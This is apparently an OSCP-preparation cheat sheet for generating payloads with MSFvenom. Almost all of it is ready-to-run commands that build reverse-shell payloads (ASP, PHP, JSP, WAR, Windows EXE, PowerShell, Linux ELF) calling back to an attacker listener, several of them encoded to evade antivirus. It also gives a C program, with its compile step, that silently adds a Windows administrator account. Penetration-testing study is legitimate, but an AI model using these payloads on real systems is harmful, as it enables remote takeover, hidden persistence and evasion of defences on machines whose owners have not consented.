---
icon: shield-halved
description: Generate payload with MSFvenom
---

# MSFvenom Generate Payload

### Listing Available Options

```bash
msfvenom -l payloads # Payloads
msfvenom -l encoders # Encoders
msfvenom -l platforms # Platforms
msfvenom -l formats # Formats
```

{% hint style="info" %}
**Note**: I created this page during my OSCP preparation. All payloads here are for gaining a reverse shell through Netcat, as Metasploit (or Meterpreter) is prohibited.
{% endhint %}

### Web Based Payload

ASP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f asp > asuka.asp
```

PHP Payload

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
echo "<?php" | cat - shell.php > temp && mv temp shell.php
```

JSP Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=31337 -f raw > shell.jsp
```

WAR Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=31337 -f war > shell.war
```

### Windows

Create User

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe -o adduser.exe
```

Execute Command

{% code overflow="wrap" %}
```bash
# x86
msfvenom -a x86 -p windows/exec CMD="calc.exe" -e x86/shikata_ga_nai -f exe -o payload.exe
# x64
msfvenom -p windows/x64/exec CMD="calc.exe" -f exe -e x64/xor_dynamic -o payload-x64.exe
```
{% endcode %}

Reverse Shell

{% code overflow="wrap" %}
```bash
# x86
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4443 -f exe -e x86/shikata_ga_nai -o reverse86.exe
# x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4443 -f exe -e x64/xor_dynamic -o reverse64.exe
```
{% endcode %}

PowerShell

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=wlan0 LPORT=31337 -f psh -e x64/xor_dynamic -o rev.ps1
```
{% endcode %}

### Linux

{% code overflow="wrap" %}
```bash
# x86
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=1337 -e x86/shikata_ga_nai -f elf -o asuka-x86.elf
# x64
msfvenom -a x64 -p linux -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -e x64/xor_dynamic -f elf -o asuka-64.elf
```
{% endcode %}

### Add Windows User

**adduser.c**

{% code overflow="wrap" %}
```c
#include <stdlib.h>

int main ()
{
	int i;
	i = system ("net user admoon Linuxsec#1337 /add");
	i = system ("net localgroup administrators admoon /add");

		return 0;
}
```
{% endcode %}

Compile:

{% code overflow="wrap" %}
```powershell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
{% endcode %}
